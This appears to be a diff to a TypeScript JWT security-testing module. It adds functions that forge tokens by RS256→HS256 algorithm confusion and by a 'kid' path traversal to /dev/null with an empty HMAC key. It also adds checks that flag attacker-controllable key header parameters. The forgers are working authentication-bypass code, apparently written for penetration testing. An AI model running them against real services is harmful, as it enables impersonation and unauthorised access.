@@ -165,6 +165,28 @@ export function forgeResigned(jwt: Jwt, secret: string, claimChanges: Record<str
   return `${signingInput}.${sig}`
 }
 
+// alg-confusion (RS256 → HS256): re-sign the token as HS256 using the RSA/EC PUBLIC key material as the
+// HMAC secret. A server that verifies with its public key regardless of `alg` will accept this — it can
+// forge tokens using only the (public) verification key. Requires the public key (discovered/supplied).
+export function forgeAlgConfusion(jwt: Jwt, publicKey: string, claimChanges: Record<string, unknown> = {}): string {
+  const header = { ...jwt.header, alg: "HS256" }
+  const payload = { ...jwt.payload, ...claimChanges }
+  const signingInput = `${jsonB64url(header)}.${jsonB64url(payload)}`
+  const sig = createHmac("sha256", publicKey).update(signingInput).digest("base64url")
+  return `${signingInput}.${sig}`
+}
+
+// `kid` path-traversal to an empty/known file: point `kid` at a file whose contents are predictable
+// (classically /dev/null → an EMPTY key) and sign with that key. A server that loads the HMAC key from
+// the kid-named file will verify against the empty string. Accepted ⇒ kid traversal + known-key forgery.
+export function forgeKidEmptyKey(jwt: Jwt, kid = "../../../../../../../../dev/null", claimChanges: Record<string, unknown> = {}): string {
+  const header = { ...jwt.header, alg: "HS256", kid }
+  const payload = { ...jwt.payload, ...claimChanges }
+  const signingInput = `${jsonB64url(header)}.${jsonB64url(payload)}`
+  const sig = createHmac("sha256", "").update(signingInput).digest("base64url")
+  return `${signingInput}.${sig}`
+}
+
 // ── Static analysis (no replay) ─────────────────────────────────────────────────────────────────
 
 export interface JwtStatic {
@@ -173,7 +195,14 @@ export interface JwtStatic {
   weak_secret?: string // a dictionary secret that verifies the signature (deterministic break)
   expired: boolean // exp is in the past
   exp?: number
+  rsa: boolean // RS*/PS*/ES* — asymmetric, so alg-confusion (→HS256 with the public key) is worth trying
+  // Header parameters that let a token name/carry its own verification key. Attacker-influenced key
+  // resolution: `kid` (path/SQL injection into key lookup), `jku`/`x5u` (fetch a key from a URL — SSRF +
+  // key substitution), `jwk` (embed a self-signed key). Presence is an attack surface to test.
+  header_surface: string[]
 }
+
+const KEY_HEADER_PARAMS = ["kid", "jku", "x5u", "jwk", "x5c"] as const
 
 export function analyzeJwtStatic(jwt: Jwt, now: number = Date.now()): JwtStatic {
   const alg = String(jwt.header.alg ?? "").toUpperCase()
@@ -184,5 +213,7 @@ export function analyzeJwtStatic(jwt: Jwt, now: number = Date.now()): JwtStatic 
     weak_secret: findWeakSecret(jwt),
     expired: exp != null && exp * 1000 < now,
     exp,
+    rsa: /^(RS|PS|ES)/.test(alg),
+    header_surface: KEY_HEADER_PARAMS.filter((p) => p in jwt.header),
   }
 }
